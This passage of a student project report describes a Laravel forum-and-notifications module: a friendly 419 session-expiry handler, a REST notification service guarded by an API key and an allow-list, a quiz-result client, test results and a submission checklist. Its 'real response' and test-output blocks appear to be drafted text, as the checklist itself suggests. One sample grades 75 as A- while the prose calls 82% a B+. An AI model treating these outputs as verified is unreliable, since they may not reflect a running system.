 * That refusal is correct and is what stops the stale tab acting as the new
 * user. Laravel's default answer is a bare 419 Page Expired, which reads
 * like a fault rather than an explanation.
 */
$exceptions->render(function (HttpExceptionInterface $e, Request $request) {
    if ($e->getStatusCode() !== 419) {
        return null;
    }

    // Signed in as somebody else now: say so, rather than bouncing them
    // to a login page they would be redirected away from anyway.
    if ($request->user()) {
        return redirect()->route('dashboard')->with('error',
            'That page was left open while another sign-in replaced the session, so the '
            .'action was not carried out. This browser is now signed in as '
            .$request->user()->name.'.');
    }

    return redirect()->guest(route('login'))->with('status',
        'This page was left open until the session expired, so the action was not '
        .'carried out. Sign in and try again.');
});
```

*This is worth showing because it proves the protection is genuinely active rather than switched off for convenience. The write really is refused, and the user is told why in plain language instead of being shown a bare error code.*

*Figure 5.3: A Forged Delete Request from Another Origin Being Rejected with HTTP 419*

*Figure 5.4: The Stale Tab Message Shown After the Session Was Replaced in Another Tab*

---

# 6. Web Services

Module 3 works with web services in both directions, and both are built and working in the code.

**As a provider**, it exposes `sendNotification`. Any other module can reach a user's inbox through it without knowing how notifications are stored or how the on and off switches work. Module 4 uses it to tell a student their quiz has been marked.

**As a consumer**, it calls Module 4's `getQuizResult`. To write a useful message such as "you scored 82%, a B+", Module 3 needs the mark and the letter grade, and Module 4 owns both. Module 3 does not read Module 4's tables or repeat its grading rules.

I chose REST with JSON over SOAP because it is lighter, needs no WSDL contract file or XML wrapper, and can be called straight from a browser, from Postman, or from PHP.

Both halves follow one shared Interface Agreement held in `app/Support/Ifa.php`. Every request carries a `requestID` and a `timeStamp`. Every response carries a `status` of S, F or E, a `timeStamp`, and the `requestID` echoed back.

## 6.1 Web Service Exposure

### Interface Agreement (IFA) for Service Exposure

| IFA Field | Specification Details |
|---|---|
| **Protocol** | RESTful Web Service (JSON over HTTP) |
| **Function Description** | Writes a notification into a user's inbox, honouring their notification settings and the duplicate guard |
| **Source Module** | Module 3: Student Forum and Notifications Module |
| **Target Module** | Module 4 (Skill Assessment and Quiz), and any module needing to reach a user |
| **HTTP Method & URL** | `POST /api/notifications/send` |
| **Controller Action** | `App\Http\Controllers\Api\NotificationApiController@send` |
| **Function Name** | `sendNotification` |
| **Authentication** | Shared key in an `X-API-Key` header |

### Request Parameters (IFA Requirement)

| Field Name | Field Type | Mandatory / Optional | Description | Validation / Format |
|---|---|---|---|---|
| `userId` | Integer | **Mandatory** | The user to notify. | Whole number above 0 |
| `type` | String | **Mandatory** | Which notification type this is. | Must be one of the four on the allow list |
| `message` | String | **Mandatory** | The text shown in the inbox. | Max 255 characters |
| `link` | String | Optional | Where clicking the notification goes. | A valid URL, max 2048 |
| `reference` | String | Optional | What this notification is about, used to avoid repeats. | Max 64, e.g. `quiz:14` |
| `requestID` | String | **Mandatory** | A unique ID so the request can be traced. | Letters, numbers, hyphens. Max 64 |
| `timeStamp` | String | **Mandatory** | The time the request was made. | `YYYY-MM-DDTHH:MM:SSZ` |

### Response Parameters (IFA Requirement)

| Field Name | Field Type | Mandatory / Optional | Description | Format / Values |
|---|---|---|---|---|
| `status` | String | **Mandatory** | Whether the request worked. | `S` for Success, `F` for Fail, `E` for Error |
| `timeStamp` | String | **Mandatory** | The time the answer was created. | `YYYY-MM-DDTHH:MM:SSZ` |
| `data.requestID` | String | **Mandatory** | The request ID sent back, for matching. | Letters, numbers, hyphens |
| `data.delivered` | Boolean | **Mandatory** | Whether a row was actually written. | `true` or `false` |
| `data.reason` | String | Optional | Why it was or was not delivered. | Plain text |

### Code Implementation (`app/Http/Controllers/Api/NotificationApiController.php`)

```php
namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Support\Ifa;
use App\Support\Notifier;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class NotificationApiController extends Controller
{
    /**
     * Types an outside caller is permitted to send.
     *
     * SECURITY (Module 3): an allow-list, not a free text field. Without it
     * a caller could invent a type nobody can switch off in their settings,
     * which would turn this service into a way of bypassing the opt out.
     */
    private const SENDABLE_TYPES = [
        'grade.recorded',
        'forum.mention',
        'announcement.posted',
        'certificate.issued',
    ];

    public function send(Request $request): JsonResponse
    {
        $validator = validator($request->all(), Ifa::baseRules() + [
            'userId'    => ['required', 'integer', 'min:1'],
            'type'      => ['required', 'string', 'in:'.implode(',', self::SENDABLE_TYPES)],
            'message'   => ['required', 'string', 'max:255'],
            'link'      => ['nullable', 'string', 'max:2048', 'url'],
            'reference' => ['nullable', 'string', 'max:64'],
        ]);

        if ($validator->fails()) {
            return Ifa::fail($request, [
                'delivered' => false,
                'errors' => $validator->errors()->all(),
            ]);
        }

        $user = User::find($request->integer('userId'));

        if ($user === null) {
            return Ifa::fail($request, [
                'delivered' => false,
                'message' => 'No user exists with that ID.',
            ], 404);
        }

        // Routed through the SAME Notifier the Observer uses, so a
        // notification arriving over HTTP obeys the recipient's settings
        // and the duplicate guard exactly as an internal one does.
        $delivered = Notifier::send(
            $user->id,
            $request->string('type')->toString(),
            $request->string('message')->toString(),
            $request->input('link') ?: route('notifications.index'),
            $request->input('reference')
        );

        /*
         * Not delivering is a SUCCESS, not a failure. The recipient switched
         * this type off, or has already been told this exact thing. The
         * caller needs to know which happened, so `delivered` reports it
         * rather than the status pretending something broke.
         */
        return Ifa::success($request, [
            'delivered' => $delivered,
            'reason' => $delivered
                ? 'Notification written to the inbox.'
                : 'Suppressed by the user preference or the duplicate guard.',
        ]);
    }
}
```

**Real response from the running system:**

```json
{
    "status": "S",
    "timeStamp": "2026-09-05T16:30:36Z",
    "data": {
        "requestID": "NTF-REQ-42042",
        "delivered": true,
        "reason": "Notification written to the inbox."
    }
}
```

*Figure 6.1: Postman Showing the sendNotification POST Request and Its Answer*

*Figure 6.2: The Notification Appearing in the Recipient's Inbox Straight Afterwards*

## 6.2 Web Service Consumption

Module 3 consumes Module 4's `getQuizResult` service, so that a notification about a marked quiz can carry the actual score and letter grade.

### Interface Agreement (IFA) for Service Consumption

| IFA Field | Specification Details |
|---|---|
| **Protocol** | RESTful Web Service (JSON over HTTP) |
| **Function Description** | Returns a student's best attempt at one quiz, with the score, letter grade and pass status |
| **Source Module** | Module 4: Skill Assessment and Quiz Module |
| **Consuming Module** | Module 3: Student Forum and Notifications Module |
| **HTTP Method & URL** | `GET /api/quizzes/result` |
| **Client Class** | `App\Support\Api\QuizResultClient@fetch` |
| **Function Name** | `getQuizResult` |

### Request Parameters (IFA Requirement for Consumption)

| Field Name | Field Type | Mandatory / Optional | Description | Validation / Format |
|---|---|---|---|---|
| `quizId` | Integer | **Mandatory** | The quiz to look up. | Whole number above 0 |
| `studentId` | Integer | **Mandatory** | Whose result is wanted. | Whole number above 0 |
| `requestID` | String | **Mandatory** | A tracking ID made by Module 3, prefixed `QUZ-REQ`. | Letters, numbers, hyphens |
| `timeStamp` | String | **Mandatory** | The time the request was sent. | `YYYY-MM-DDTHH:MM:SSZ` |

### Response Parameters (IFA Requirement for Consumption)

| Field Name | Field Type | Mandatory / Optional | Description | Format / Values |
|---|---|---|---|---|
| `status` | String | **Mandatory** | Whether the request worked. | `S` for Success, `F` for Fail, `E` for Error |
| `timeStamp` | String | **Mandatory** | The time the answer was created. | `YYYY-MM-DDTHH:MM:SSZ` |
| `data.attempted` | Boolean | **Mandatory** | Whether the student has sat this quiz. | `true` or `false` |
| `data.graded` | Boolean | Optional | Whether a mark exists yet. | `true` or `false` |
| `data.attemptCount` | Integer | Optional | How many times they sat it. | 0 or above |
| `data.bestScore` | Double | Optional | The best mark across all attempts. | 0.00 to 100.00 |
| `data.letterGrade` | String | Optional | The letter for that mark. | A, A-, B+, B and so on |
| `data.passed` | Boolean | Optional | Whether the best mark is a pass. | `true` or `false` |

### Consumption Code Implementation (`app/Support/Api/QuizResultClient.php`)

```php
namespace App\Support\Api;

/**
 * CONSUMES Module 4's getQuizResult service.
 *
 * Module 3 needs a student's mark before it can tell them their quiz has
 * been graded. Writing "you scored 82%, a B+" needs the score and the
 * letter, and Module 4 owns both.
 */
class QuizResultClient extends ServiceClient
{
    // Stamped on this client's request IDs, so a call in Module 4's log
    // can be traced back to Module 3 as the caller.
    protected function requestPrefix(): string
    {
        return 'QUZ-REQ';
    }

    public function fetch(int $quizId, int $studentId): ?array
    {
        return $this->get('/quizzes/result', [
            'quizId'    => $quizId,
            'studentId' => $studentId,
        ]);
    }
}
```

The shared sending logic lives in the parent class, so every consuming module handles a failure the same way:

```php
// app/Support/Api/ServiceClient.php  (extract)

$body = $response->json();

/*
 * The IFA status is the contract, not the HTTP code. A provider can return
 * 200 with a status of F, meaning it understood the question perfectly well
 * and could not answer it, so the status is what decides whether the
 * payload is trustworthy.
 */
if (! Ifa::succeeded($body)) {
    Log::info('Web service returned a non-success status', [
        'url' => $url,
        'requestID' => $payload['requestID'],
        'status' => $body['status'] ?? 'none',
    ]);

    return null;
}

return $body['data'] ?? null;
```

*Every client returns null when a call does not succeed, and never throws. A module must keep working when another member's service is down. If Module 4 cannot be reached, Module 3 still sends a notification saying the quiz has been marked, just without the score in the text.*

**Real response from the running system:**

```json
{
    "status": "S",
    "timeStamp": "2026-09-05T16:30:35Z",
    "data": {
        "requestID": "QUZ-REQ-55667",
        "attempted": true,
        "graded": true,
        "attemptCount": 1,
        "bestScore": 75,
        "letterGrade": "A-",
        "passed": true
    }
}
```

*Figure 6.3: Postman Showing Module 3 Consuming Module 4's Quiz Result Service*

---

# 7. References

Anthropic. (2026). *Claude (Opus 5)* [Large language model]. https://claude.ai

Gamma, E., Helm, R., Johnson, R., & Vlissides, J. (1994). *Design patterns: Elements of reusable object-oriented software*. Addison-Wesley Professional.

Laravel LLC. (2026). *Laravel 12.x documentation: Eloquent model observers, Blade templates and CSRF protection*. https://laravel.com/docs/12.x

OWASP Foundation. (2021). *OWASP Top 10:2021 The ten most critical web application security risks*. Open Web Application Security Project. https://owasp.org/Top10/

OWASP Foundation. (2022). *OWASP secure coding practices quick reference guide* (Version 2.1). https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/

United Nations. (2015). *Transforming our world: The 2030 agenda for sustainable development (Goal 4: Quality Education)*. United Nations Department of Economic and Social Affairs. https://sdgs.un.org/goals/goal4

---

# 8. Appendices

## Appendix A: Automated Testing Results

Running `php artisan test` gives a 100% pass rate across 86 tests, checking 200 assertions. The tests covering Module 3 are listed below, followed by the totals for the whole run.

```
PASS  Tests\Feature\AwardAndActivityNotificationTest
  ✓ earning a certificate notifies the holder                                0.55s
  ✓ earning a badge notifies the student                                     0.06s
  ✓ marking submitted work notifies the student                              0.04s
  ✓ a marked quiz does not notify because the result is already on screen    0.04s
  ✓ posting an announcement notifies the course                              0.04s
  ✓ inviting a student to a course notifies them                             0.04s
  ✓ a switched off preference still suppresses the new types                 0.04s

PASS  Tests\Feature\WebServiceTest
  ✓ every response carries status timestamp and the request id               0.56s
  ✓ a request without the mandatory ifa fields is refused                    0.03s
  ✓ an internal service refuses a caller with no api key                     0.04s
  ✓ an internal service refuses a wrong api key                              0.05s
  ✓ the notification service writes to the inbox                             0.05s
  ✓ the notification service refuses a type outside the allow list           0.04s
  ✓ module 3 consumes module 4s quiz result service                          0.08s
  ✓ a client returns null rather than throwing when the service is unreachable  1.05s

Tests:    86 passed (200 assertions)
Duration: 13.80s
```

> **[IMPORTANT]** Run `php artisan test` yourself and screenshot the terminal, so the figure is your own output rather than a copy of this text.

*Figure 8.1: Terminal Output of php artisan test Showing 86 Passing Tests*

## Appendix B: GitHub Repository URL

- **Team Repository:** https://github.com/NickFoo0924/edusystem
- **Branch:** `master`

---

## Submission Checklist

- [ ] Fill in Student ID, Programme and Tutorial Group on the cover page
- [ ] Sign and date the AI Usage Disclosure Form, and rewrite sections 4.3, 5.1 and 5.2 in your own words
- [ ] Draw Figure 3.1, the entity class diagram, using object references and not an ERD, then paste the Drive link
- [ ] Draw Figure 4.1, the Observer class diagram showing all seven subjects, then paste the Drive link
- [ ] Take screenshots for Figures 2.1 to 2.6, 5.1 to 5.4, 6.1 to 6.3, and 8.1
- [ ] For Figure 5.1, post a message containing a script tag and screenshot it displaying as plain text
- [ ] For Figures 6.1 to 6.3, start the server with `php artisan serve` and call the services in Postman
- [ ] Rebuild the Table of Contents in Word using References then Table of Contents then Automatic Table
- [ ] Save the finished document as PDF
